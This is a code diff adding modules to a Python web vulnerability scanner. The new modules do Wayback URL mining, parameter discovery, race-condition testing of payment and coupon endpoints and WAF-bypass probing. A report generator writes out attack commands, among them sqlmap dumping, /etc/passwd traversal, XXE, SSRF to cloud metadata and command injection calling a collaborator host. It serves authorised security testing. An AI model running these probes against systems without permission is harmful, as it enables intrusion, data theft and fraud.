+        r = rget(wb_api, timeout=12, allow_redirects=True)
+        if r.status_code == 200:
+            try:
+                data = r.json()
+                # data[0] is header row ["original"], rest are data rows
+                if len(data) > 1:
+                    historical_urls = [row[0] for row in data[1:] if row]
+                    info(f"Wayback: {len(historical_urls)} historical URLs found")
+
+                    # Look for sensitive historical endpoints
+                    INTERESTING = [
+                        "/admin", "/backup", "/config", "/database", "/db",
+                        "/.git", "/.env", "/phpinfo", "/debug", "/test",
+                        "/api/", "/swagger", "/actuator", "/console",
+                        "/.aws", "/.ssh", "/password", "/secret", "/credential",
+                        "/staging", "/dev/", "/internal/", "/private/",
+                        ".sql", ".bak", ".zip", ".tar", ".log", ".conf",
+                        "?debug=", "?admin=", "?password=", "?token=",
+                    ]
+
+                    sensitive_hist = [u for u in historical_urls
+                                      if any(x in u.lower() for x in INTERESTING)]
+
+                    if sensitive_hist:
+                        warn(f"Wayback: {len(sensitive_hist)} sensitive historical URLs")
+                        add("wayback_urls", {
+                            "severity": "Medium",
+                            "confirmed": True,
+                            "title": f"Sensitive Historical URLs in Wayback Machine ({len(sensitive_hist)} URLs)",
+                            "description": f"Wayback Machine has {len(historical_urls)} archived URLs for {domain}. {len(sensitive_hist)} appear sensitive. Historical endpoints may still be accessible or reveal application structure.",
+                            "recommendation": "Test each sensitive historical URL for current accessibility. Remove sensitive files from production. Add to robots.txt (note: doesn't remove existing archives).",
+                            "url": url,
+                            "evidence": "Sensitive URLs: " + " | ".join(sensitive_hist[:5]),
+                        })
+
+                        # Try to access top 5 sensitive historical URLs
+                        for hist_url in sensitive_hist[:5]:
+                            try:
+                                r2 = rget(hist_url, timeout=5, allow_redirects=True)
+                                if r2.status_code == 200 and len(r2.text) > 100:
+                                    vuln(f"Historical endpoint still live: {hist_url}", "High")
+                                    add("wayback_urls", {
+                                        "severity": "High",
+                                        "confirmed": True,
+                                        "title": f"Historical Sensitive Endpoint Still Accessible: {hist_url[:80]}",
+                                        "description": f"CONFIRMED: Historical URL from Wayback Machine is still live and returns 200. This endpoint may contain sensitive information or deprecated functionality.",
+                                        "recommendation": "Remove or restrict access to this endpoint. Conduct full security audit of this path.",
+                                        "url": hist_url,
+                                        "evidence": f"HTTP 200, {len(r2.text)} bytes — URL from Wayback archive is still live",
+                                    })
+                            except Exception: pass
+                    else:
+                        info(f"Wayback: {len(historical_urls)} URLs found, none appear sensitive")
+                        add("wayback_urls", {
+                            "severity": "Info",
+                            "confirmed": True,
+                            "title": f"Wayback Machine: {len(historical_urls)} Historical URLs Archived",
+                            "description": f"Wayback Machine has archived {len(historical_urls)} URLs for {domain}. No obviously sensitive paths detected.",
+                            "recommendation": "Periodically review archived URLs. Remove sensitive content from production.",
+                            "url": url,
+                            "evidence": f"{len(historical_urls)} historical URLs found",
+                        })
+                else:
+                    info(f"Wayback: no historical data for {domain}")
+            except (ValueError, KeyError): pass
+        else:
+            info(f"Wayback CDX API returned HTTP {r.status_code}")
+    except Exception as e:
+        info(f"Wayback scan error: {e}")
+
+    good("Wayback scan complete")
+    _module_done("wayback_urls")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 70 — PARAMETER DISCOVERY (Arjun-style)
+# ═══════════════════════════════════════════════════════════════════════
+def param_discovery_scan(url):
+    if _module_skip("param_discover"): return
+    section("MODULE 70 — PARAMETER DISCOVERY","🔎")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    path   = parsed.path or "/"
+
+    # Common hidden parameters to test
+    HIDDEN_PARAMS = [
+        "id", "user_id", "uid", "account", "admin", "debug", "test",
+        "redirect", "url", "next", "return", "callback", "file", "path",
+        "include", "require", "page", "module", "action", "cmd", "command",
+        "exec", "execute", "query", "search", "q", "s", "token", "key",
+        "api_key", "apikey", "secret", "password", "pass", "pwd",
+        "email", "username", "user", "name", "type", "format", "output",
+        "lang", "language", "locale", "currency", "country",
+        "category", "cat", "section", "sub", "parent",
+        "sort", "order", "orderby", "dir", "asc", "desc",
+        "limit", "offset", "count", "size", "num",
+        "start", "end", "from", "to", "date",
+        "tab", "view", "mode", "layout", "theme", "color",
+        "source", "ref", "referrer", "origin",
+        "verbose", "log", "trace", "data", "value",
+        "config", "conf", "setting", "options",
+        "auth", "access", "role", "permission",
+        "proxy", "host", "server", "port", "ip",
+        "xml", "json", "yaml", "content", "body",
+    ]
+
+    # Baseline response for comparison
+    try:
+        r_baseline = rget(url, timeout=TIMEOUT)
+        baseline_len = len(r_baseline.text)
+        baseline_status = r_baseline.status_code
+    except Exception:
+        good("Parameter discovery skipped — baseline failed")
+        _module_done("param_discover"); return
+
+    info(f"Parameter discovery: testing {len(HIDDEN_PARAMS)} parameters on {path}")
+    discovered = []
+
+    def _test_param(param):
+        try:
+            test_url = f"{base}{path}?{param}=test"
+            r = rget(test_url, timeout=TIMEOUT, allow_redirects=True)
+            # Different status = interesting
+            if r.status_code != baseline_status:
+                discovered.append((param, r.status_code, f"Status changed: {baseline_status} → {r.status_code}"))
+                return
+            # Significantly different response size = interesting
+            diff = abs(len(r.text) - baseline_len)
+            if diff > 500:  # > 500 bytes difference
+                discovered.append((param, r.status_code, f"Response size changed: {baseline_len} → {len(r.text)} bytes (Δ {diff})"))
+                return
+            # Error indicators = interesting
+            body_low = r.text.lower()
+            if any(x in body_low for x in ["undefined","null","notice:","warning:","error:"]):
+                # Also check if NOT in baseline
+                if not any(x in r_baseline.text.lower() for x in ["undefined","null","notice:","warning:","error:"]):
+                    discovered.append((param, r.status_code, "Error indicator appeared in response"))
+        except Exception:
+            pass
+
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        futs = [ex.submit(_test_param, p) for p in HIDDEN_PARAMS]
+        for f in as_completed(futs): _pass(f)
+
+    if discovered:
+        warn(f"Parameter discovery: {len(discovered)} hidden parameters found")
+        for param, status, reason in discovered[:10]:
+            add("param_discover", {
+                "severity": "Medium",
+                "confirmed": False,
+                "title": f"Hidden Parameter Discovered: '{param}'",
+                "description": f"Parameter '{param}' produced a different server response than the baseline. This suggests the parameter is processed by the application. Manual testing required to determine exploitability.",
+                "recommendation": "Review all discovered parameters for injection vulnerabilities (SQLi, XSS, SSRF, path traversal). Remove unnecessary debug/admin parameters from production.",
+                "url": f"{base}{path}?{param}=test",
+                "evidence": f"Param '{param}' → {reason}",
+            })
+    else:
+        good("No hidden parameters discovered")
+
+    _module_done("param_discover")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  MODULE 71 — RACE CONDITION TESTING
+# ═══════════════════════════════════════════════════════════════════════
+def race_condition_scan(url):
+    if _module_skip("race_condition"): return
+    section("MODULE 71 — RACE CONDITION TESTING","🏁")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Find race-condition-prone endpoints
+    RACE_ENDPOINTS = [
+        # Payment/Transaction
+        ("/api/checkout",      "POST", {"amount": "10", "item_id": "1"}),
+        ("/api/purchase",      "POST", {"product_id": "1", "quantity": "1"}),
+        ("/api/payment",       "POST", {"amount": "10"}),
+        ("/api/transfer",      "POST", {"amount": "100", "to": "user2"}),
+        # Coupon/Discount
+        ("/api/coupon/apply",  "POST", {"code": "SAVE10"}),
+        ("/api/discount",      "POST", {"code": "DISCOUNT10"}),
+        ("/api/voucher",       "POST", {"code": "VOUCHER10"}),
+        # Like/Vote (should be single-use)
+        ("/api/like",          "POST", {"post_id": "1"}),
+        ("/api/vote",          "POST", {"option_id": "1"}),
+        ("/api/react",         "POST", {"item_id": "1", "type": "like"}),
+        # Referral/Bonus
+        ("/api/referral",      "POST", {"code": "REF123"}),
+        ("/api/bonus",         "POST", {"type": "daily"}),
+    ]
+
+    for ep, method, data in RACE_ENDPOINTS:
+        ep_url = base + ep
+        try:
+            # First probe the endpoint
+            probe = rget(ep_url, allow_redirects=False, timeout=4)
+            if probe.status_code not in (200, 201, 400, 401, 403, 405, 422):
+                continue
+
+            # Race condition test: send 10 simultaneous requests
+            results = []
+            lock = threading.Lock()
+
+            def _race_req():
+                try:
+                    r = rpost(ep_url, json=data, timeout=5)
+                    with lock:
+                        results.append((r.status_code, r.text[:200]))
+                except Exception: pass
+
+            # Synchronize start for maximum concurrency
+            ready = threading.Barrier(10, timeout=5)
+            threads = []
+            for _ in range(10):
+                def _t():
+                    try: ready.wait()
+                    except Exception: pass
+                    _race_req()
+                t = threading.Thread(target=_t)
+                t.daemon = True
+                threads.append(t)
+
+            for t in threads: t.start()
+            for t in threads: t.join(timeout=8)
+
+            if len(results) >= 2:
+                success_count = sum(1 for status, body in results
+                                    if status in (200, 201) and
+                                    any(x in body.lower() for x in
+                                        ["success","applied","ok","true","accepted","created"]))
+
+                if success_count >= 2:
+                    vuln(f"Race condition CONFIRMED at {ep} — {success_count}/10 concurrent requests succeeded", "High")
+                    add("race_condition", {
+                        "severity": "High",
+                        "confirmed": True,
+                        "title": f"Race Condition CONFIRMED — {ep}",
+                        "description": f"CONFIRMED: {success_count} out of 10 simultaneous requests to {ep_url} succeeded concurrently. This indicates insufficient atomicity in the operation — attackers can abuse this to apply coupons multiple times, transfer more than available balance, or trigger duplicate actions.",
+                        "recommendation": "Use database transactions with proper isolation level (SERIALIZABLE). Implement optimistic locking. Use atomic compare-and-swap operations. Redis distributed locks for critical sections.",
+                        "url": ep_url,
+                        "evidence": f"{success_count}/10 concurrent requests returned success status",
+                    })
+
+        except Exception: pass
+
+    good("Race condition scan complete")
+    _module_done("race_condition")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  WAF BYPASS SCAN
+# ═══════════════════════════════════════════════════════════════════════
+def waf_bypass_scan(url):
+    """Test WAF bypass techniques — if WAF detected, try to find bypasses."""
+    if _module_skip("waf_bypass"): return
+    # Only run if WAF was detected
+    waf_detected = any(item.get("title","").startswith("WAF") for item in FINDINGS.get("waf",[])) if FINDINGS.get("waf") else False
+
+    if not waf_detected:
+        info("No WAF detected — skipping WAF bypass scan")
+        _module_done("waf_bypass"); return
+
+    section("WAF BYPASS TESTING","🛡️")
+
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    if not params:
+        params = {"id": ["1"], "search": ["test"]}
+
+    info(f"Testing {len(WAF_BYPASS_SQLI)} WAF bypass SQLi payloads and {len(WAF_BYPASS_XSS)} bypass XSS payloads")
+
+    DB_ERRORS = ["sql syntax","mysql","postgres","oracle","sqlite","database error",
+                 "sql error","odbc","unclosed quotation","syntax error"]
+    _bypassed = threading.Event()
+
+    def _test_bypass(param, payload, ptype):
+        if _bypassed.is_set(): return
+        tp = dict(params); tp[param] = [payload]
+        test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
+        try:
+            r = rget(test_url, timeout=TIMEOUT)
+            body_low = r.text.lower()
+            if ptype == "sqli":
+                if any(err in body_low for err in DB_ERRORS):
+                    _bypassed.set()
+                    vuln(f"WAF bypass successful! SQLi error returned with payload: {payload[:50]}", "Critical")
+                    add("sqli", {
+                        "severity": "Critical",
+                        "confirmed": True,
+                        "title": f"WAF Bypass SQLi — Obfuscated Payload Succeeded",
+                        "description": f"WAF bypass technique succeeded. SQL error returned with obfuscated payload: {payload[:100]}. The WAF can be circumvented.",
+                        "recommendation": "Review WAF rules. Enable anomaly detection. Use parameterized queries regardless of WAF.",
+                        "url": test_url,
+                        "evidence": f"Bypass payload: {payload[:100]}",
+                    })
+            elif ptype == "xss":
+                if payload in r.text or payload.lower() in r.text.lower():
+                    _bypassed.set()
+                    vuln(f"WAF bypass successful! XSS reflected with payload: {payload[:50]}", "High")
+                    add("xss", {
+                        "severity": "High",
+                        "confirmed": True,
+                        "title": f"WAF Bypass XSS — Obfuscated Payload Reflected",
+                        "description": f"WAF bypass technique succeeded. XSS payload reflected with obfuscation: {payload[:100]}.",
+                        "recommendation": "Update WAF rules to cover obfuscated payloads. Implement input validation server-side.",
+                        "url": test_url,
+                        "evidence": f"Bypass payload: {payload[:100]}",
+                    })
+        except Exception: pass
+
+    tasks = []
+    for param in list(params.keys())[:3]:
+        for p in WAF_BYPASS_SQLI: tasks.append((param, p, "sqli"))
+        for p in WAF_BYPASS_XSS:  tasks.append((param, p, "xss"))
+
+    with ThreadPoolExecutor(max_workers=10) as ex:
+        futs = [ex.submit(_test_bypass, p, pl, t) for p, pl, t in tasks]
+        for f in as_completed(futs): _pass(f)
+
+    if not _bypassed.is_set():
+        good("WAF bypass: no successful bypass found")
+    _module_done("waf_bypass")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  EXPERT VALIDATION REPORT (4th Report)
+# ═══════════════════════════════════════════════════════════════════════
+def _get_expert_commands(cat, item, target_url):
+    """Generate manual verification commands for a finding."""
+    sev   = item.get("severity","Info")
+    title = item.get("title","")
+    furl  = item.get("url", target_url)
+    param = item.get("param","id")
+    db    = item.get("db_type","MySQL")
+
+    parsed = urlparse(furl)
+    domain = parsed.hostname or urlparse(target_url).hostname or ""
+
+    commands = []
+
+    if cat == "sqli":
+        commands = [
+            {
+                "tool": "sqlmap",
+                "desc": "Automated SQLi exploitation and database dumping",
+                "cmd": f'sqlmap -u "{furl}" --dbs --batch --level=3 --risk=2 --random-agent --timeout=10',
+            },
+            {
+                "tool": "sqlmap (forms)",
+                "desc": "Test all form inputs for SQLi",
+                "cmd": f'sqlmap -u "{target_url}" --forms --dbs --batch --crawl=2 --random-agent',
+            },
+            {
+                "tool": "curl (manual error-based)",
+                "desc": "Quick manual check for SQL error",
+                "cmd": f"curl -s '{furl}&{param}=%27' | grep -iE 'sql|error|warning|mysql|syntax'",
+            },
+            {
+                "tool": "curl (time-based blind)",
+                "desc": "Confirm time-based blind SQLi",
+                "cmd": f"time curl -s '{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}=%27+AND+SLEEP(5)--+-'",
+            },
+        ]
+    elif cat == "xss":
+        commands = [
+            {
+                "tool": "curl",
+                "desc": "Verify XSS reflection",
+                "cmd": f"curl -s '{furl}&{param}=<script>alert(1)</script>' | grep -iE 'script|alert'",
+            },
+            {
+                "tool": "dalfox",
+                "desc": "Advanced XSS scanner and exploitation",
+                "cmd": f'dalfox url "{furl}" --follow-redirects --timeout 10',
+            },
+            {
+                "tool": "curl (bypass attempts)",
+                "desc": "Test WAF bypass XSS payloads",
+                "cmd": f"curl -s '{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}=<svg/onload=alert(1)>' | grep -iE 'svg|onload|alert'",
+            },
+        ]
+    elif cat == "lfi":
+        commands = [
+            {
+                "tool": "curl",
+                "desc": "Test path traversal",
+                "cmd": f"curl -s '{furl}&{param}=../../../../etc/passwd' | grep -iE 'root:|daemon:|/bin/'",
+            },
+            {
+                "tool": "curl (encoded)",
+                "desc": "URL-encoded LFI bypass",
+                "cmd": f"curl -s '{furl}&{param}=..%2F..%2F..%2Fetc%2Fpasswd' | grep -iE 'root:|daemon:'",
+            },
+        ]
+    elif cat == "ssrf":
+        commands = [
+            {
+                "tool": "curl (AWS metadata)",
+                "desc": "Test SSRF to AWS metadata service",
+                "cmd": f"curl -s '{furl}&{param}=http://169.254.169.254/latest/meta-data/' | grep -iE 'ami-id|instance'",
+            },
+            {
+                "tool": "curl (localhost probe)",
+                "desc": "Test SSRF to localhost services",
+                "cmd": f"curl -s '{furl}&{param}=http://127.0.0.1:22/' | grep -vE '404|not found'",
+            },
+        ]
+    elif cat == "cmdi":
+        commands = [
+            {
+                "tool": "curl",
+                "desc": "Test command injection",
+                "cmd": f"curl -s '{furl}&{param}=test%3Bid' | grep -iE 'uid=|gid=|root|www-data'",
+            },
+            {
+                "tool": "curl (OOB via DNS)",
+                "desc": "Test blind CMDi with DNS callback",
+                "cmd": f"curl -s '{furl}&{param}=`nslookup+attacker.burpcollaborator.net`'",
+            },
+        ]
+    elif cat == "xxe":
+        commands = [
+            {
+                "tool": "curl",
+                "desc": "Test XXE with external entity",
+                "cmd": (f"curl -s -X POST '{furl}'"
+                        " -H 'Content-Type: application/xml'"
+                        " -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'"
+                        " | grep -iE 'root:|daemon:'"),
+            },
+        ]
+    elif cat == "ports":
+        port = item.get("port", "")
+        commands = [
+            {
+                "tool": "nmap",
+                "desc": "Full service version scan on discovered ports",
+                "cmd": f"nmap -sV -sC -p {port} {domain} --open",
+            },
+            {
+                "tool": "nmap (vuln scripts)",
+                "desc": "Run vulnerability detection scripts",
+                "cmd": f"nmap --script vuln -p {port} {domain}",
+            },
+        ]
+    elif cat == "ssl_tls":
+        commands = [
+            {
+                "tool": "testssl.sh",
+                "desc": "Comprehensive SSL/TLS analysis",
+                "cmd": f"./testssl.sh {domain}",
+            },
+            {
+                "tool": "nmap (ssl-enum)",
+                "desc": "Enumerate SSL ciphers",
+                "cmd": f"nmap --script ssl-enum-ciphers -p 443 {domain}",
+            },
+            {
+                "tool": "openssl",
+                "desc": "Check certificate details",
+                "cmd": f"openssl s_client -connect {domain}:443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -text",
+            },
+        ]
+    elif cat == "cors":
+        commands = [
+            {
+                "tool": "curl",
+                "desc": "Test CORS with arbitrary origin",
+                "cmd": f"curl -sI -H 'Origin: https://evil.com' '{furl}' | grep -iE 'access-control|origin'",
+            },
+            {
+                "tool": "cors-scanner",
+                "desc": "Automated CORS misconfiguration testing",
+                "cmd": f"python3 cors_scanner.py -u '{furl}' -v",
+            },
+        ]
+    elif cat in ("cloud_bucket", "s3_brute"):
+        commands = [
+            {
+                "tool": "aws cli",
+                "desc": "List bucket contents",
+                "cmd": f"aws s3 ls s3://{domain}/ --no-sign-request 2>&1",
+            },
+            {
+                "tool": "aws cli (download)",
+                "desc": "Download bucket contents",
+                "cmd": f"aws s3 sync s3://{domain}/ ./bucket_dump/ --no-sign-request 2>&1",
+            },
+        ]
+    elif cat == "jwt":
+        commands = [
+            {
+                "tool": "jwt_tool",
+                "desc": "Test JWT vulnerabilities (alg:none, RS/HS confusion)",
+                "cmd": f"python3 jwt_tool.py <token_here> -M at -t '{target_url}' -rc 'Authorization: Bearer <token>'",
+            },
+        ]
+    elif cat == "sqli" and "time" in title.lower():
+        commands = [
+            {
+                "tool": "sqlmap (time-based)",
+                "desc": "Exploit time-based blind SQLi",
+                "cmd": f'sqlmap -u "{furl}" -p "{param}" --technique=T --dbms="{db}" --batch --dbs',
+            },
+        ]
+    elif cat == "cve_scan":
+        tech = re.search(r"CVE Match: ([\w]+)", title)
+        tech_name = tech.group(1) if tech else "component"
+        commands = [
+            {
+                "tool": "nmap (vuln scripts)",
+                "desc": f"Check known CVEs for {tech_name}",
+                "cmd": f"nmap --script vuln -p 80,443,8080 {domain}",
+            },
+            {
+                "tool": "nuclei",
+                "desc": "Run CVE templates against target",
+                "cmd": f"nuclei -u '{target_url}' -t cves/ -severity high,critical",
+            },
+        ]
+    else:
+        # Generic commands
+        commands = [
+            {
+                "tool": "curl",
+                "desc": "Manual verification request",
+                "cmd": f"curl -v '{furl}' -H 'User-Agent: Mozilla/5.0'",
+            },
+            {
+                "tool": "nmap",
+                "desc": "Service and vulnerability scan",
+                "cmd": f"nmap -sV --script vuln {domain}",
+            },
+        ]
+
+    return commands
+
+
+def _build_expert_report(target, out_path):
+    """Build the Expert Validation Report — 4th report with manual verification commands."""
+    ts_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    counts = _sev_counts()
+    total  = _total()
+    score  = _risk_score()
+
+    # Only include Critical and High findings in expert report
+    expert_findings = []
+    for cat, items in FINDINGS.items():
+        for item in items:
+            sev = item.get("severity","Info")
+            if sev in ("Critical","High"):
+                meta = CAT_META.get(cat, {})
+                icon, label = CAT_TITLES.get(cat, ("🔍", cat.upper()))
+                expert_findings.append({
+                    **item,
+                    "_cat": cat,
+                    "_icon": icon,
+                    "_label": label,
+                    "_owasp": meta.get("owasp",""),
+                    "_owasp_name": meta.get("owasp_name",""),
+                    "_cwe": meta.get("cwe",""),
+                    "_cvss": meta.get("cvss",0.0),
+                    "_biz": meta.get("biz",""),
+                })
+
+    sev_order = {"Critical":0,"High":1}
+    expert_findings.sort(key=lambda x: sev_order.get(x.get("severity","High"),2))
+
+    findings_html = ""
+    for idx, f in enumerate(expert_findings, 1):
+        sev   = f.get("severity","High")
+        col   = "#e74c3c" if sev == "Critical" else "#e67e22"
+        title = f.get("title", f.get("url","Finding"))
+        desc  = f.get("description","")
+        evid  = f.get("evidence","")
+        rec   = f.get("recommendation","")
+        owasp = f.get("_owasp","")
+        cwe   = f.get("_cwe","")
+        cvss  = f.get("_cvss",0.0)
+        biz   = f.get("_biz","")
+        label = f.get("_label","")
+        icon  = f.get("_icon","🔍")
+        is_confirmed = f.get("confirmed", False)
+        conf_txt = "✅ CONFIRMED" if is_confirmed else "⚠️ POTENTIAL"
+        conf_col = "#27ae60" if is_confirmed else "#e67e22"
+
+        # Generate verification commands
+        commands = _get_expert_commands(f.get("_cat",""), f, target)
+        cmd_html = ""
+        for cmd_info in commands:
+            cmd_html += f"""
+              <div class="cmd-block">
+                <div class="cmd-tool">🔧 {cmd_info['tool']}</div>
+                <div class="cmd-desc">{cmd_info['desc']}</div>
+                <pre class="cmd-code">{cmd_info['cmd']}</pre>
+              </div>"""
+
+        findings_html += f"""
+    <div class="expert-finding" id="f{idx}">
+      <div class="ef-header" style="border-left:5px solid {col}">
+        <div class="ef-num">#{idx}</div>
+        <div class="ef-info">
+          <div class="ef-title">{icon} [{label}] {title}</div>
+          <div class="ef-badges">
+            <span class="badge" style="background:{col}">{sev}</span>
+            <span class="badge" style="background:{conf_col}">{conf_txt}</span>
+            {'<span class="badge badge-owasp">' + owasp + '</span>' if owasp else ''}
+            {'<span class="badge badge-cwe">' + cwe + '</span>' if cwe else ''}
+            {'<span class="badge badge-cvss">CVSS ' + str(cvss) + '</span>' if cvss else ''}
+          </div>
+        </div>
+      </div>
+      <div class="ef-body">
+        {'<div class="ef-section"><b>Description:</b><p>' + desc + '</p></div>' if desc else ''}
+        {'<div class="ef-section evid"><b>Evidence:</b><p>' + evid + '</p></div>' if evid else ''}
+        {'<div class="ef-section biz"><b>Business Impact:</b><p>' + biz + '</p></div>' if biz else ''}
+        {'<div class="ef-section rec"><b>Remediation:</b><p>' + rec + '</p></div>' if rec else ''}
+        <div class="ef-section cmds">
+          <b>🔬 Expert Verification Commands</b>
+          <p class="warn-note">⚠️ Run these only on systems you own or have written permission to test.</p>
+          {cmd_html if cmd_html else '<p class="muted">No specific verification commands for this finding type.</p>'}
+        </div>
+      </div>
+    </div>"""
+
+    html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WebScan Pro v{VERSION} — Expert Validation Report — {target}</title>
+<style>
+  :root{{--bg:#0a0e1a;--card:#111827;--border:#1f2d40;--text:#e2e8f0;--accent:#60a5fa;--muted:#64748b}}
+  *{{box-sizing:border-box;margin:0;padding:0}}
+  body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,monospace;padding:2rem 1rem;line-height:1.6}}
+  .container{{max-width:1100px;margin:0 auto}}
+  .header{{background:linear-gradient(135deg,#1e3a5f,#111827);border:1px solid #1e40af;border-radius:12px;padding:2rem;margin-bottom:2rem}}
+  h1{{color:#60a5fa;font-size:1.6rem;margin-bottom:.3rem}}
+  .subtitle{{color:#94a3b8;font-size:.9rem}}
+  .meta{{display:flex;gap:1rem;flex-wrap:wrap;margin-top:1rem}}
+  .meta-item{{background:#0f172a;border:1px solid var(--border);border-radius:6px;padding:.4rem .8rem;font-size:.8rem}}
+  .meta-item b{{color:var(--accent)}}
+  .summary-row{{display:flex;gap:1rem;flex-wrap:wrap;margin-bottom:2rem}}
+  .sc{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1rem 1.5rem;text-align:center;min-width:100px}}
+  .sc .n{{font-size:2rem;font-weight:700}}
+  .c{{color:#ef4444}}.h{{color:#f97316}}.sc-score{{color:#60a5fa}}
+  .expert-finding{{background:var(--card);border:1px solid var(--border);border-radius:10px;margin-bottom:1.5rem;overflow:hidden}}
+  .ef-header{{display:flex;align-items:flex-start;gap:1rem;padding:1rem 1.2rem;background:#0f172a}}
+  .ef-num{{font-size:1.3rem;font-weight:900;color:var(--accent);min-width:2rem}}
+  .ef-title{{font-weight:700;font-size:.95rem;margin-bottom:.4rem}}
+  .ef-badges{{display:flex;gap:.4rem;flex-wrap:wrap}}
+  .badge{{border-radius:4px;padding:.15rem .5rem;font-size:.7rem;font-weight:700;color:#fff}}
+  .badge-owasp{{background:#1e40af}}.badge-cwe{{background:#065f46}}.badge-cvss{{background:#7c3aed}}
+  .ef-body{{padding:1.2rem}}
+  .ef-section{{margin-bottom:1rem;font-size:.88rem}}
+  .ef-section b{{display:block;color:var(--accent);margin-bottom:.3rem;font-size:.9rem}}
+  .ef-section p{{color:#cbd5e1;padding:.4rem;background:#0f172a;border-radius:4px;border-left:3px solid var(--border)}}
+  .ef-section.evid p{{border-left-color:#3b82f6;color:#93c5fd}}
+  .ef-section.biz p{{border-left-color:#f59e0b;color:#fcd34d}}
+  .ef-section.rec p{{border-left-color:#10b981;color:#6ee7b7}}
+  .ef-section.cmds{{background:#0a0e1a;border:1px solid #1e3a5f;border-radius:8px;padding:1rem;margin-top:.5rem}}
+  .ef-section.cmds b{{color:#f0abfc;font-size:.95rem}}
+  .cmd-block{{background:#0f172a;border:1px solid #1e3a5f;border-radius:6px;padding:.8rem;margin:.6rem 0}}
+  .cmd-tool{{color:#a78bfa;font-weight:700;font-size:.85rem;margin-bottom:.2rem}}
+  .cmd-desc{{color:#94a3b8;font-size:.8rem;margin-bottom:.4rem}}
+  .cmd-code{{background:#020617;color:#86efac;font-family:'Courier New',monospace;font-size:.82rem;padding:.6rem .8rem;border-radius:4px;overflow-x:auto;white-space:pre;border-left:3px solid #10b981}}
+  .warn-note{{color:#fbbf24;font-size:.78rem;padding:.3rem .5rem;background:#451a03;border-radius:3px;margin:.3rem 0}}
+  .muted{{color:var(--muted);font-style:italic}}
+  .toc{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1rem 1.5rem;margin-bottom:2rem}}
+  .toc h3{{color:var(--accent);margin-bottom:.6rem;font-size:1rem}}
+  .toc a{{color:#94a3b8;text-decoration:none;font-size:.85rem;display:block;padding:.15rem 0}}
+  .toc a:hover{{color:var(--accent)}}
+  .section-title{{font-size:1.1rem;font-weight:700;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:.4rem;margin-bottom:1rem}}
+  footer{{text-align:center;color:var(--muted);font-size:.75rem;margin-top:2rem;padding-top:1rem;border-top:1px solid var(--border)}}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>🔬 Expert Validation Report</h1>
+    <div class="subtitle">WebScan Pro v{VERSION} — Manual Verification Guide for Security Experts</div>
+    <div class="meta">
+      <div class="meta-item"><b>Target:</b> {target}</div>
+      <div class="meta-item"><b>Generated:</b> {ts_str}</div>
+      <div class="meta-item"><b>Critical/High Findings:</b> {len(expert_findings)}</div>
+      <div class="meta-item"><b>Risk Score:</b> {score}/100</div>
+    </div>
+  </div>
+
+  <div class="summary-row">
+    <div class="sc"><div class="n sc-score">{score}</div><div>Risk Score</div></div>
+    <div class="sc"><div class="n">{total}</div><div>Total</div></div>
+    <div class="sc"><div class="n c">{counts.get('Critical',0)}</div><div>Critical</div></div>
+    <div class="sc"><div class="n h">{counts.get('High',0)}</div><div>High</div></div>
+    <div class="sc"><div class="n">{len(expert_findings)}</div><div>In Report</div></div>
+  </div>
+
+  <div class="toc">
+    <h3>📋 Table of Contents (Critical & High Only)</h3>
+    {''.join(f'<a href="#f{i+1}">{i+1}. [{f["_label"]}] {f.get("title","Finding")[:70]}...</a>' for i, f in enumerate(expert_findings))}
+  </div>
+
+  <div class="section-title">Critical & High Findings — Expert Verification</div>
+
+  {findings_html if findings_html else '<div style="color:#64748b;padding:2rem;text-align:center">No Critical or High findings to report.</div>'}
+
+  <footer>WebScan Pro v{VERSION} Expert Report — For authorized security testing only. OWASP Top 10 (2021) · CVSS v3.1</footer>
+</div>
+</body>
+</html>"""
+
+    with open(out_path, "w", encoding="utf-8") as f:
+        f.write(html)
 
 if __name__ == "__main__":
     main()
